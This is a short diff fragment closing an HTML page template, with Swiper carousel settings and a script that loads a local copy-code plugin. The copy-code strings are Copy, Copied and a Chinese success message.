+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
